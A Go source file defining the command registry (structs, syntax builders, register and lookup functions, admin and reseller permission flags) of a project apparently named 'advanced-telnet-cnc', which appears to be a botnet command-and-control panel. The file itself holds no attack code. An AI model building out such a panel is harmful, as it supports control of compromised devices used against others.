package command

import (
	"advanced-telnet-cnc/source/config"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"errors"
	"fmt"
	"strings"
)

var (
	// commands - Commands map, where all the commands are saved.
	commands = make(map[string]*Command)
)

var (
	ErrNotEnoughArguments = errors.New("not enough arguments")
)

type Argument struct {
	Name     string
	Optional bool
}

// Command - Structure of the command
type Command struct {
	Aliases     []string
	Description string
	Admin       bool
	Reseller    bool
	Usage       []Argument
	SubCommands []*SubCommand
	Executor    func(args []string, fx *termfx.TermFX, session *sessions.Session) error
}

type SubCommand struct {
	Aliases         []string
	Admin, Reseller bool
	Arguments       []Argument
	Executor        func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *Command) error
}

func (c *Command) Syntax() string {
	var syntaxStr string
	for _, syntax := range c.Usage {
		if syntax.Optional {
			syntaxStr += fmt.Sprintf("[%s] ", syntax.Name)
			continue
		}
		syntaxStr += fmt.Sprintf("<%s> ", syntax.Name)
	}
	return c.Aliases[0] + " " + syntaxStr
}

func (c *SubCommand) Syntax(parent *Command) string {
	if len(c.Arguments) < 1 {
		return parent.Aliases[0] + " " + c.Aliases[0]
	}
	var syntaxStr string
	for _, syntax := range c.Arguments {
		if syntax.Optional {
			syntaxStr += fmt.Sprintf("[%s] ", syntax.Name)
			continue
		}
		syntaxStr += fmt.Sprintf("<%s> ", syntax.Name)
	}
	return parent.Aliases[0] + " " + c.Aliases[0] + " " + syntaxStr
}

// Make - Registers the command
func Make(command *Command) {
	if _, exists := commands[command.Aliases[0]]; exists {
		config.Logger.Fatal("Failed to add command to registry", "err", "command already exists", "names", strings.Join(command.Aliases, "\r\n"))
	}

	commands[command.Aliases[0]] = command

	config.Logger.Info(fmt.Sprintf("Added %s to the command registry", command.Aliases[0]), "aliases", strings.Join(command.Aliases[1:], "\n"))
}

func Subcommand(parent string, command *SubCommand) {
	c := Retrieve(parent)
	if c == nil {
		config.Logger.Fatal("Failed to add sub-command to registry", "err", "sub-command already exists")
		return
	}

	c.SubCommands = append(c.SubCommands, command)
}

// Retrieve - Gets the command from the map
func Retrieve(alias string) *Command {
	for _, command := range commands {
		for _, s := range command.Aliases {
			if alias == s {
				return command
			}
		}
	}
	return nil
}

func RetrieveSubCommand(parent string, alias string) *SubCommand {
	for _, command := range commands {
		for _, s := range command.Aliases {
			if parent == s {
				for _, subCommand := range command.SubCommands {
					for _, s := range subCommand.Aliases {
						if alias == s {
							return subCommand
						}
					}
				}
			}
		}
	}
	return nil
}

// Clone - Gets all cmdImpl in a slice
func Clone() []*Command {
	var commandSlice []*Command
	for _, cmd := range commands {
		commandSlice = append(commandSlice, cmd)
	}

	return commandSlice
}
